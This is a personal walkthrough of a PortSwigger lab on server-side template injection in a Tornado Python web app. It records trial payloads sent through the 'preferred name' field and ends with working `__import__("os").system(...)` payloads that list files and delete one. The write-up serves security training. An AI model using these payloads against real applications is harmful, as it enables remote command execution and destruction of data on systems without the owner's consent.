# Server-side template injection
## [Lab: Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
Difficulty: Practitioner\
Date completed: 2026-06-26\
Resources used: [tornado.template](https://www.tornadoweb.org/en/stable/template.html), [Bypass Python sandboxes](https://github.com/slytechroot/HackTricks/tree/master/generic-methodologies-and-resources/python/bypass-python-sandboxes)

I mucked around for a bit at first:
* `/post?postId=2*2` -> "Invalid blog post ID"
* [`/post?postId={% 2*2 %}`](https://www.tornadoweb.org/en/stable/template.html) -> "Invalid blog post ID"
* Tried making a comment with content `{{7*7}}` -> This created a new comment "{{7*7}}" by user "anonymous".
* Logged in as `wiener`, tried injecting into the email box -> It complained about all the special characters I tried
* `/my-account?id={{7*7}}` -> It sent me to the login page, nothing interesting happened

The lab hint said to look at the "preferred name" functionality, so I intercepted the dropdown POST request to inject things like `{% 3*3 %}` and `dir(user)` using Burp Repeater. But the webapp seemed to take whatever I gave it in stride -- no errors, but no results either. I couldn't tell if my input was being ignored.

Eventually I realized the variable `blog-post-author-display` would probably show its value in blog posts. I went through all of the blog posts looking for ones that `wiener` had authored, but there were none. I did see my anonymous comments, though. Bright idea: I made a new comment with content "asdf", this time while logged in as wiener. After reloading, my comment seemed to be posted under this username: `['__doc__', '__init__', '__module__', 'first_name', 'name', 'nickname']`. (It was in HTML-encoded format, but I [converted](https://codebeautify.org/html-decode-string) it for this writeup.)

Excellent! So now I have a way to see my Python output. I just have to see what libraries are at my disposal to find and delete files.

Here's what I got as my preferred name when I set it in Burp Repeater:
* `os.listdir('/')` -> `NameError: global name 'os' is not defined`
* `import os; os.listdir('/')` -> `SyntaxError: invalid syntax`
* `import os\nos.listdir('/')` -> `SyntaxError: invalid syntax`
* [`glob.glob("/")`](https://stackoverflow.com/questions/2759323/how-can-i-list-the-contents-of-a-directory-in-python) -> `NameError: global name 'glob' is not defined`
* `locals()` -> `{'_tt_buffer': [], '_tt_append': <built-in method append of list object at 0x7f2f86441f50>}`
* `globals()` -> Many functions, objects, exceptions, etc., but no `os` or `glob`.
* [`commands.getoutput("ls")`](https://github.com/slytechroot/HackTricks/tree/master/generic-methodologies-and-resources/python/bypass-python-sandboxes) -> `NameError: global name 'commands' is not defined`
* `subprocess.call("ls", shell=True)` -> `NameError: global name 'subprocess' is not defined`
* `importlib.import_module("os").system("ls")` -> `NameError: global name 'importlib' is not defined`
* `imp.load_source("os","/usr/lib/python2.7/os.py").system("ls")` -> `NameError: global name 'imp' is not defined`
* `__import__("os").system("ls")` -> `morale.txt`

Goal!

* `__import__("os").system("rm morale.txt")` -> Solved the lab!